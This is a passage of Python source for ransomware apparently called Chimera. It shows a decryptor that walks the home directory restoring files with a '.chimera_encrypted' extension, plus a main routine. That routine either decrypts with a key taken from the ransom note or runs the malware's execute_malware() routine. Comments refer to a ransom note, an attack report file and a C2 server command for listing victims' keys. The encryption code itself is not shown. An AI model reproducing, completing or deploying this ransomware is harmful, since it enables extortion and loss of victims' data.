            if not hasattr(self, '_error_shown'):
                print(f"\n[!] DECRYPTION ERROR: {str(e)}")
                print(f"[!] This usually means the key is incorrect or in wrong format")
                print(f"[!] File: {os.path.basename(encrypted_path)}\n")
                self._error_shown = True
            return False
    
    def decrypt_all_files(self, start_folder):
        """Decrypt all encrypted files in a folder and subdirectories"""
        decrypted_count = 0
        failed_count = 0
        total_encrypted = 0
        
        # First, count total encrypted files
        print(f"[*] Scanning for encrypted files in: {start_folder}")
        for root, dirs, files in os.walk(start_folder):
            for file in files:
                if file.endswith('.chimera_encrypted'):
                    total_encrypted += 1
        
        print(f"[*] Found {total_encrypted} encrypted files")
        print(f"[*] Starting decryption...\n")
        
        # Decrypt each file with progress reporting
        for root, dirs, files in os.walk(start_folder):
            for file in files:
                if file.endswith('.chimera_encrypted'):
                    file_path = os.path.join(root, file)
                    if self.decrypt_file(file_path):
                        decrypted_count += 1
                        # Show progress every 10 files
                        if decrypted_count % 10 == 0:
                            print(f"    Progress: {decrypted_count}/{total_encrypted} files decrypted...")
                    else:
                        failed_count += 1
        
        # Final report
        print(f"\n{'='*50}")
        print(f"DECRYPTION COMPLETE")
        print(f"{'='*50}")
        print(f"✓ Successfully decrypted: {decrypted_count} files")
        if failed_count > 0:
            print(f"✗ Failed to decrypt: {failed_count} files")
        print(f"Total processed: {total_encrypted} files")
        return decrypted_count

# ==========================================
# MAIN EXECUTION
# ==========================================

if __name__ == "__main__":
    # Check if we're in decryption mode
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        if len(sys.argv) > 2:
            # Get the key from command line
            key_str = sys.argv[2]
            print(f"[*] Attempting decryption with key: {key_str}")
            
            try:
                # CRITICAL FIX: Handle both URL-safe and standard base64 formats
                # Convert URL-safe base64 to standard base64
                # Replace - with + and _ with /
                import base64
                
                # Try URL-safe base64 first (common in modern systems)
                try:
                    # Add padding if needed
                    key_str_padded = key_str
                    padding_needed = len(key_str) % 4
                    if padding_needed:
                        key_str_padded += '=' * (4 - padding_needed)
                    
                    # Decode URL-safe base64
                    key_bytes = base64.urlsafe_b64decode(key_str_padded)
                    print(f"[*] Decoded URL-safe base64 key ({len(key_bytes)} bytes)")
                except:
                    # Fallback to standard base64
                    try:
                        key_bytes = base64.b64decode(key_str)
                        print(f"[*] Decoded standard base64 key ({len(key_bytes)} bytes)")
                    except:
                        # Last resort: use as-is (encoded string)
                        key_bytes = key_str.encode()
                        print(f"[*] Using key as UTF-8 encoded string")
                
                # Fernet expects the key to be exactly 32 bytes when base64 decoded
                if len(key_bytes) != 32:
                    print(f"[!] WARNING: Key is {len(key_bytes)} bytes, expected 32 bytes")
                    print(f"[!] This key may not work. Check if you copied the complete key.")
                
                decryptor = ChimeraDecryptor(key_bytes)
                decryptor.decrypt_all_files(os.path.expanduser("~"))
                
            except Exception as e:
                print(f"\n[!] FATAL ERROR: Could not initialize decryptor")
                print(f"[!] Error: {e}")
                print(f"\n[?] TROUBLESHOOTING:")
                print(f"    1. Make sure you copied the COMPLETE key from the ransom note")
                print(f"    2. Key should be ~44 characters long (base64 format)")
                print(f"    3. Check chimera_attack_report.txt or READ_ME_FOR_DECRYPT.txt")
                print(f"    4. On C2 server, use 'keys' command to view all encryption keys")
        else:
            print("Usage: python chimera_real.py --decrypt <FULL_KEY_FROM_NOTE>")
            print("Encryption key can be found in chimera_attack_report.txt or ransom note")
    else:
        # Run the malware
        malware = CompleteChimeraMalware()
        malware.execute_malware()